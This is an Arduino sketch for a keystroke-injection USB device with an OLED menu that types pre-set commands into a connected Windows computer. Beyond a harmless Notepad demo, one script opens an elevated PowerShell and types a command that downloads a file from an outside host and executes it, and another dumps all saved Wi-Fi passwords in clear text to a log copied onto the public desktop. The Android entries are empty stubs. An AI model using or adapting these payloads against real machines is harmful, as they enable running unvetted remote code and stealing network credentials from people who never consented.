#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Keyboard.h>

 

#define SCREEN_WIDTH 128 // OLED display width, in pixels
#define SCREEN_HEIGHT 32 // OLED display height, in pixels

// Declaration for an SSD1306 display connected to I2C (SDA, SCL pins)
#define OLED_RESET     4 // Reset pin # (or -1 if sharing Arduino reset pin)
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

const int button = 11;
const int button1 = 10;
const int button2 = 9;

//int mainmenusubcounter[] = {3, 3};
int menustate=0;
int menumax=2;
char *mainmenu[] = {"WINDOWS", "ANDROID"};
int submenustate=0;
int submenumax=3;
char *submenu[][3] = {{"OPEN NOTEPAD", "DOWNLOAD & OPEN FILE", "GET WIFI CREDENTIAL"}, {"ANDROID SCRIPT 1", "ANDROID SCRIPT 2", "ANDROID SCRIPT 3"}};
int menulevel=0;

void setup() {
  // put your setup code here, to run once:
 pinMode(button, INPUT_PULLUP);
 pinMode(button1, INPUT_PULLUP);
 pinMode(button2, INPUT_PULLUP);
 Serial.begin(9600);

  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { // Address 0x3C for 128x32
    Serial.println(F("SSD1306 allocation failed"));
    for(;;); // Don't proceed, loop forever
  }

  display.display();
  display.clearDisplay();
  display.setRotation(2);
  display.setTextSize(2);     
  display.setTextColor(WHITE); 
  display.setCursor(0, 0);   
  display.println(mainmenu[menustate]);
  display.display();
}

void loop() {
  if (digitalRead(button) == LOW ) {
    if(menustate==0 && menulevel==0){
      menustate=menumax-1;
    }else if(menustate!=0 && menulevel==0){
      menustate=menustate-1;
    }else if(submenustate==0 && menulevel==1){
      submenustate=submenumax-1;
    }else if(submenustate!=0 && menulevel==1){
      submenustate=submenustate-1;
    }
    updatemenu(menustate,submenustate);
  }else{}

  if (digitalRead(button1) == LOW ) {
    if(menulevel==0){
      menulevel++;
    }else if(menulevel==1){
      //selectscript
      executescript();
    }
    updatemenu(menustate,submenustate);
  }else{}

  if (digitalRead(button2) == LOW ) {
    if(menustate==(menumax-1) && menulevel==0){
      menustate=0;
    }else if(menustate!=(menumax-1) && menulevel==0){
      menustate=menustate+1;
    }else if(submenustate==(submenumax-1) && menulevel==1){
      submenustate=0;
    }else if(submenustate!=(submenumax-1) && menulevel==1){
      submenustate=submenustate+1;
    }
    updatemenu(menustate,submenustate);
  }else{}
  delay(200);
}

void updatemenu(int tempmenustate,int tempsubmenustate){
  if(menulevel==0){
    display.clearDisplay();
    display.setTextSize(2);     
    display.setTextColor(WHITE); 
    display.setCursor(0, 0);   
    display.println(mainmenu[tempmenustate]);
    display.display();
  }else if(menulevel==1){
    display.clearDisplay();
    display.setTextSize(1);     
    display.setTextColor(WHITE); 
    display.setCursor(0, 0);   
    display.println(mainmenu[tempmenustate]);
    display.println(submenu[tempmenustate][tempsubmenustate]);
    display.display();
  }
}

void script1(){
  Keyboard.begin();
  delay(1000);
 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(10);
  Keyboard.releaseAll();
  delay(200);
 
  Keyboard.print("notepad");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("WELCOME BACK TO MAKERDIARY");
  delay(5000);
 
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a');
  delay(10);
  Keyboard.releaseAll();
 
  Keyboard.press(KEY_DELETE);
  delay(10);
  Keyboard.releaseAll();
 
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(10);
  Keyboard.releaseAll();
 
  Keyboard.end();
}

void script2(){
  String url = "http://makerdiary.id/temp/Makerdiarylogo2.png";
  String file = "Makerdiarylogo2.png";
  
  Keyboard.begin();
  delay(1000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(300);
  
  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  typeKey(KEY_RETURN);
  delay(2000);
  
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(121);
  Keyboard.releaseAll();
  delay(2000);
  
  Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = \"tls12, tls11, tls\"; $down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = '" + file +"'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($PSScriptRoot + $file); exit;");
  typeKey(KEY_RETURN);
  Keyboard.end();
}

void script3(){
   Keyboard.begin();
  delay(1000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(300);
  
  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  typeKey(KEY_RETURN);
  delay(2000);
  
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(121);
  Keyboard.releaseAll();
  delay(2000);
 
  Keyboard.print("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)} | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >> log.txt");
  typeKey(KEY_RETURN);
  delay(1500);

  Keyboard.print("copy-item log.txt c:\\users\\public\\desktop");
  typeKey(KEY_RETURN);
  delay(1500);

  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  
  Keyboard.end();
}


void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void executescript(){
  if(menustate==0 && submenustate==0){
    script1();
  }else if(menustate==0 && submenustate==1){
    script2();
  }else if(menustate==0 && submenustate==2){
    script3();
  }else if(menustate==1 && submenustate==0){
    
  }else if(menustate==1 && submenustate==1){
    
  }else if(menustate==1 && submenustate==2){
    
  }
}

